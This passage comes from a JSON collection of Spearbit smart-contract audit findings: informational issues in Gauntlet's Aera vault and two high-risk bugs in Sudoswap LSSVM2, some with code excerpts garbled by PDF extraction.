Informational"]}, {"title": "Rename FinalizationInitialized to FinalizationInitiated for code consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The function at L517 was renamed from initializeFinalization to initiateFinalization to avoid confusion with the Aera vault initialization. For code consistency, the corresponding event and error names should be changed.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Consider enforcing an explicit check on token order to avoid human error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Balancer protocol require (and enforce during the pool creation) that the pools token must be ordered by the token address. The following functions accept an uint256[] of amounts or weights without knowing if the order inside that array follow the same order of the tokens inside the Balancer pool.  initialDeposit  deposit  withdraw  enableTradingWithWeights  updateWeightsGradually While its impossible to totally prevent the human error (they could specify the correct token order but wrongly swap the input order of the amount/weight) we could force the user to be more aware of the specific order in which the amounts/weights must be specified. A possible solution applied to the initialDeposit as an example could be: 37 function initialDeposit(IERC20[] calldata tokensSorted, uint256[] calldata amounts) external override onlyOwner { // ... other code IERC20[] memory tokens = getTokens(); // check that also the tokensSorted length match the lenght of other arrays if (tokens.length != amounts.length || tokens.length != tokensSorted.length) { revert Aera__AmountLengthIsNotSame( tokens.length, amounts.length ); } // ... other code for (uint256 i = 0; i < tokens.length; i++) { // check that the token position associated to the amount has the same position of the one in ,! the balancer pool if( address(tokens[i]) != address(tokensSorted[i]) ) { revert Aera__TokenOrderIsNotSame( address(tokens[i]), address(tokensSorted[i]), i ); } depositToken(tokens[i], amounts[i]); } // ... other code } Another possible implementation would be to introduce a custom struct struct TokenAmount { IERC20 token; uint256 value; } Update the function signature function initialDeposit(TokenAmount[] calldata tokenWithAmount) and up- date the example code following the new parameter model. Its important to note that while this solution will not completely prevent the human error, it will increase the gas consumption of each function.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Swap is not enabled after initialDeposit execution", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the current deployment flow of the AeraVault the Balancer pool is created (by the constructor) with swapEnabledOnStart set as false. When the pool receives their initial funds via initialDeposit the pool has still the swap functionality disabled. It is not explicitly clear in the specification document and in the code when the swap functionality should be enabled. If the protocol wants to enable the swap as soon as the funds are deposited in the pool, they should call, after bVault.joinPool(...), setSwapEnabled(true) or enableTradingWithWeights(uint256[] calldata weights) in case the external spot price is not aligned (both functions will also trigger a SetSwapEnabled event)", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Remove commented code and replace input values with Balancer enum", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Inside initialDeposit function, there is some commented code (used as example) that should be removed for clarity and future confusion. The initUserData should not use direct input values (0 in this case) but use the correct Balancers enum value to avoid any possible confusion. Following the Balancer documentation  Encoding userData  JoinKind The correct way to declare initUserData is using the WeightedPoolUserData.JoinKind.INIT enum value.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "The Created event is not including all the information used to deploy the Balancer pool and are missing indexed properties", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current Created event is defined as 39 event Created( address indexed factory, IERC20[] tokens, uint256[] weights, address manager, address validator, uint32 noticePeriod, string description ); And is missing some of the information that are used to deploy the pool. To allow external tools to better monitor the deployment of the pools, it should be better to include all the information that have been used to deploy the pool on Balancer. The following information is currently missing from the event definition:  name  symbol  managementFee  swapFeePercentage The event could also define both manager and validator as indexed event parameters to allow external tools to filter those events by those values.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Rename temp variable managers to assetManagers to avoid confusions and any potential future mistakes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The managers declared in the linked code (see context) are in reality Asset Manager that have a totally different role compared to the AeraVault Manager role. The AssetManager is able to control the pools balance, withdrawing from it or depositing into it. To avoid confusion and any potential future mistakes, it should be better to rename the temporary variable managers to a more appropriate name like assetManagers. - address[] memory managers = new address[](tokens.length); + address[] memory assetManagers = new address[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { - + } managers[i] = address(this); assetManagers[i] = address(this); pool = IBManagedPool( IBManagedPoolFactory(factory).create( - + IBManagedPoolFactory.NewPoolParams({ vault: IBVault(address(0)), name: name, symbol: symbol, tokens: tokens, normalizedWeights: weights, assetManagers: managers, assetManagers: assetManagers, swapFeePercentage: swapFeePercentage, pauseWindowDuration: 0, bufferPeriodDuration: 0, owner: address(this), swapEnabledOnStart: false, mustAllowlistLPs: true, managementSwapFeePercentage: 0 }) ) ); 41", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Move description declaration inside the storage slot code block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "In the current code, the description state variable is in the block of /// STORAGE /// where all the immutable variable are re-grouped. As the dev comment say, string cannot be immutable bytecode but only set in constructor so it would be better to move it inside the /// STORAGE SLOT START /// block of variables that regroup all the non-constant and non-immutable state variables.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Remove unused imports from code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current implementation of the AeraVaultV1 contract is importing OpenZeppelin IERC165 inter- face, but that interface is never used or references in the code.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "shortfall is repeated twice in IWithdrawalValidator natspec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The word shortfall is repeated twice in the natspec comment.", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Provide definition of weights & managementFee_ in the NatSpec comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The NatSpec Format is special form of comments to provide rich documentation for functions, return variables and more. We observed an occurrence where the NatSpec comments are missing for two of the user inputs (weights & managementFee_).", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Partial fills for buy orders in ERC1155 swaps will fail when pair has insufficient balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Partial fills are currently supported for buy orders in VeryFastRouter.swap(). When _findMaxFil- lableAmtForBuy() determines numItemsToFill, it is not guaranteed that the underlying pair has so many items left to fill. While ERC721 swap handles the scenario where pair balance is less than numItemsToFill in the logic of _findAvailableIds() (maxIdsNeeded vs numIdsFound), ERC1155 swap is missing a similar check and reduction of item numbers when required. Partial fills for buy orders in ERC1155 swaps will fail when the pair has a balance less than numItemsToFill as determined by _findMaxFillableAmtForBuy(). Partial filling, a key feature of VeryFastRouter, will then not work as expected and would lead to an early revert which defeats the purpose of swap().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}, {"title": "Function token() of cloneERC1155ERC20Pair() reads from wrong location", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function token() loads the token data from position 81. However on ERC1155 pairs it should load it from position 93. Currently, it doesn't retrieve the right values and the code won't function correctly. LSSVMPair.sol: LSSVMPair.sol: 20))) ,! LSSVMPair.sol: 40))) ,! LSSVMPair.sol: 60))) _factory _bondingCurve := shr(0x60, calldataload(sub(calldatasize(), paramsLength))) := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), ,! LSSVMPairERC1155.sol: id LSSVMPairERC721.sol: _propertyChecker := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), := calldataload(add(sub(calldatasize(), paramsLength), 61)) 61))) ,! LSSVMPairERC20.sol: ,! 81))) _token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), function cloneERC1155ERC20Pair(... ) ... { assembly { ... mstore(add(ptr, 0x3e), shl(0x60, factory)) - 20 bytes mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) // position 20 - 20 bytes // position 40 - 20 bytes mstore(add(ptr, 0x66), shl(0x60, nft)) // position 60 - 1 bytes mstore8(add(ptr, 0x7a), poolType) // position 61 - 32 bytes mstore(add(ptr, 0x7b), nftId) mstore(add(ptr, 0x9b), shl(0x60, token)) // position 93 - 20 bytes ... // position 0 } } 6", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: High Risk"]}]